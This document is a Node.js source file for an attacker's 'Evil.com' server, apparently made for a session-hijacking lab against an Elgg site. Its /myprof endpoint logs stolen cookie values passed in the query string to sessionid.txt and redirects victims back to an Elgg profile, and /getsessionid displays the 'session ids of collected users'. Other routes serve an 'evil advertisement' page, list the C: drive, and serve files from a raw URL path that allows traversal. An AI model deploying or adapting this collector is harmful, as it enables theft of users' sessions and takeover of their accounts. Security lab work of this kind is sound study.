// We need an http server
var http = require('http'),
	url = require('url'),
    fs = require('fs'),
    path = require('path'),
    qs = require('querystring'); 

//Count the number of visits to the page
var countVisit = 0;

var mimeTypes = {
    "html": "text/html",
    "jpeg": "image/jpeg",
    "jpg": "image/jpeg",
    "png": "image/png",
    "js": "application/javascript",
    "css": "text/css"};


//Create an http Server
http.createServer(function (req, res) {

	//Check if request is not for favicon
	if(req.url!="/favicon.ico"){
		//increment the counter
		countVisit++;

	}else{
		res.end();
	}
	//Start creating response
    
    var urlObj = url.parse(req.url);
    //Get the page html    
    switch(urlObj.pathname){
    	case 'favicon.ico':
    		res.end();
    		break;
        case "/":
            res.writeHead(200, {'Content-Type': 'text/html'});
            var html = getHomePageHtmlCode();
            res.write(html);
            res.end();
            break;
        case "/fileList":

            fs.readdir("c:/",function(err,files){
                res.writeHead(200, {'Content-Type': 'text/html'});
                var html = getFileListHtml(files);
                res.write(html);
                res.end();
            });

            
            break;
    	case "/myprof":    		
  			var getdata = qs.parse(urlObj.query);
            var log = fs.createWriteStream('sessionid.txt', {'flags': 'a'});    
            log.write(new Date().getTime()+"::"+getdata.c+"~");
            var refUrl = url.parse(req.headers.referer);
            if(!refUrl){
                var hostname = "localhost";
            }else{
                var hostname = refUrl.hostname;
            }
            
    		res.writeHead(302,{Location: 'http://'+hostname+'/elgg/pg/profile/attack1'});
    		res.end();
    		break;
		case "/myevilad":
				var html = getEvilAdHtmlCode();
                    
                    //Start creating response
                    res.writeHead(200, {'Content-Type': 'text/html'});
                    res.write(html);
                    res.end();        
			break;
        case "/getsessionid":
            fs.readFile('sessionid.txt',function(err,data){

                if(err){
                    res.write("Some error occured");
                    res.end();        
                }else{
                    var html = getSessionHtmlCode(data);
                    
                    //Start creating response
                    res.writeHead(200, {'Content-Type': 'text/html'});
                    res.write(html);
                    res.end();        
                }
            });
            
            break;
        case "/writetofile":        
        var log = fs.createWriteStream('log.txt', {'flags': 'a'});    
        log.write("this is a message\n");
        log.close();
        res.end("written");
    	default:
            var uri = url.parse(req.url).pathname;
            var filename = path.join(process.cwd(), uri);            
            path.exists(filename, function(exists) {                
                if(!exists) {
                    res.writeHead(404);
                    res.end("Page you are looking for is not here");
                    res.end();
                    return;
                }
                var mimeType = mimeTypes[path.extname(filename).split(".")[1]];                
                res.setHeader('content-type', mimeType);
                res.writeHead(200);

                var fileStream = fs.createReadStream(filename);
                fileStream.pipe(res);
                

            }); //end path.exists   		    		
    		break;

    }   
}).listen(1338, '0.0.0.0'); // Http server at port 1337 on localhost
//Log that server is running
console.log('Server running at http://127.0.0.1:1338/');


function getSessionHtmlCode(data){

    var str = '';
    str += '<html>';
    str += '<head>';
    str += '<script type="text/javascript" src="jquery.js"></script>';
    str += '<script type="text/javascript" src="sessionid.js"></script>';
    str += '</head>';
    str += '<body>';
    str += '<div style="display:none" id="hdnSession">';
    str += data;
    str += '</div>';
    str += '<table id="myTab" border="1">';
    str += '<tr>';
    str += '<th>Timestamp</th>';
    str += '<th>Session ID</th>';
    str += '</tr>';
    str += '</table>';
    str += '</body>    ';
    str += '</html>';
    return str;
}

function getEvilAdHtmlCode(){
   var str = '';
    str += '<html>';
    str += '<head>';
    str += '<script type="text/javascript" src="jquery.js"></script>';
    str += '<script type="text/javascript" src="evilad.js"></script>';
    str += '</head>';
    str += '<body>';
    str += '<div id="hdnSession">';
	str += 'This is an evil advertisment';	
    str += '</div>';
    str += '</body>    ';
    str += '</html>';
    return str;

}


function getHomePageHtmlCode(){
    var str = '';
    str += '<html>';
    str += '<head>';
    str += '<link rel="stylesheet" href="home.css" />';
    str += '<script type="text/javascript" src="jquery.js"></script>';    
    str += '</head>';
    str += '<body>';
    str += '<div>';
    str += '<h1>';
    str += 'Welcome to Evil.com';
    str += '</h1>';
    str += '</div>';

    str += '<div id="cont">';
    
    str += '<a href="/getsessionid" class="mylink">';
    str += '<div class="title">';
    str += 'Session IDs';
    str += '</div>';
    str += '<div class="desc">';
    str += 'See session ids of collected users';
    str += '</div>';
    str += '</a>';

    str += '<a href="/getsessionid" class="mylink">';
    str += '<div class="title">';
    str += 'Session IDs';
    str += '</div>';
    str += '<div class="desc">';
    str += 'See session ids of collected users';
    str += '</div>';
    str += '</a>';


    str += '</div>';
    str += '</body>    ';
    str += '</html>';
    return str;

}

function getFileListHtml(data){

    var str = '';
    str += '<html>';
    str += '<head>';
    str += '<script type="text/javascript" src="jquery.js"></script>';    
    str += '</head>';
    str += '<body>';    
    str += '<table id="myTab" border="1">';
    str += '<tr>';    
    str += '<th>FileName</th>';
    str += '</tr>';

    for(var i in data){

        str += '<tr>';    
        str += '<tr>'+data[i]+'</tr>';
        str += '</tr>';

    }

    str += '</table>';
    str += '</body>';
    str += '</html>';
    return str;

}


